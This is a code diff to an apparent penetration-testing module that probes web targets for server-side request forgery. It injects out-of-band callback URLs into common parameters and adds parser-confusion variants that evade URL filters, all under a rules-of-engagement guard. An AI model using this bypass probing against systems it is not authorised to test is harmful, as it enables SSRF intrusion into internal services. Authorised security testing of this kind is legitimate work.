@@ -2,6 +2,7 @@ from .http_client import HttpClient
 from .config import load_engine
 from .roe_guard import ROEGuard
 from .oob import OOBServer, looks_like_command_output
+from . import ssrf_bypass
 
 COMMON_SSRF_PARAMS = ["url", "uri", "link", "callback", "webhook", "next",
                       "redirect", "redirect_uri", "dest", "destination",
@@ -28,9 +29,12 @@ def _make_client(headers, cookies, engine_cfg, guard):
 
 
 def _probe_impl(target_url, oob_server=None, method="GET", params=None, headers=None,
-          cookies=None, engine_cfg=None, wait_timeout=5.0):
+          cookies=None, engine_cfg=None, wait_timeout=5.0,
+          use_bypass=True, param=None, roe_guard=None):
+    if params is None and param is not None:
+        params = [param]
     engine_cfg = engine_cfg if engine_cfg is not None else load_engine()
-    guard = ROEGuard(engine_cfg=engine_cfg)
+    guard = roe_guard if roe_guard is not None else ROEGuard(engine_cfg=engine_cfg)
     local_oob = None
     if oob_server is None:
         try:
@@ -42,7 +46,8 @@ def _probe_impl(target_url, oob_server=None, method="GET", params=None, headers=
     else:
         oob = oob_server
     out = {"target": target_url, "oob_base": oob.base_url, "injected": [],
-           "callbacks": [], "result": None}
+           "callbacks": [], "result": None,
+           "bypass_attempts": []}
     client = _make_client(headers, cookies, engine_cfg, guard)
     token_map = {}
     try:
@@ -51,6 +56,19 @@ def _probe_impl(target_url, oob_server=None, method="GET", params=None, headers=
             token_map[token] = {"vector": f"param:{p}"}
             out["injected"].append({"vector": f"param:{p}", "token": token})
             client.request(method, target_url, params={p: url})
+            if use_bypass:
+                _variants = ssrf_bypass.parser_confusion(url)[1:3]
+                for _v in _variants:
+                    if not _v or _v == url:
+                        continue
+                    try:
+                        client.request(method, target_url,
+                                       params={p: _v})
+                    except Exception:
+                        continue
+                    out["bypass_attempts"].append(
+                        {"vector": f"param:{p}",
+                         "variant": _v, "token": token})
         for h in COMMON_SSRF_HEADERS:
             token, url = oob.payload_url()
             token_map[token] = {"vector": f"header:{h}"}
